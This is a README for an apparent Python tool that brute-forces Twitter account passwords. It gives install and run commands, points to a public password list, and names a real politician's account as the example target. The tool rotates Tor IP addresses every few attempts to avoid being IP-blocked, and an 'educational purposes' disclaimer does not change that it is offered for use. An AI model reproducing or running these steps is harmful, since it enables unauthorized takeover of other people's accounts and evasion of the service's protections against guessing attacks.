# TBA
Twitter brute force attack (for educational purposes). <br>
This attack covers attacks on multiple instances and switching IP Address after every 2-4 attemps from one instance to prevent getting IP-blocked.

# How to
1. Install Geckodriver in path (Ubuntu 18.04):
```bash
export GV=v0.26.0
wget "https://github.com/mozilla/geckodriver/releases/download/$GV/geckodriver-$GV-linux64.tar.gz"
tar xvzf geckodriver-$GV-linux64.tar.gz
chmod +x geckodriver
sudo cp geckodriver /usr/local/bin/
```
2. Download Tor binaries (Version 9.5 or newer on Ubuntu 18.04):
```bash
wget https://www.torproject.org/dist/torbrowser/9.5/tor-browser-linux64-9.5_en-US.tar.xz
tar -xf tor-browser-linux64-9.5_en-US.tar.xz
```
3. Install requirements:
```bash
pip3 install -r requirements.txt
```
4. Download suitable password list from [Github](https://github.com/danielmiessler/SecLists/tree/master/Passwords)
5. Start brute forcing using command line
```bash
python3 TBA.py <username> <path_to_password_list> <path_to_tor_binaries> -<amount_of_tor_instances_optional>
python3 TBA.py realDonaldTrump path/to/wlist.txt path/to/tor-browser_en-US -instances 15
```

# Disclaimer
Do not use this if you are not sure wether you're acting on legal grounds or not.
In general it is not allowed to log into accounts you don't own.
This was made for educational purposes.
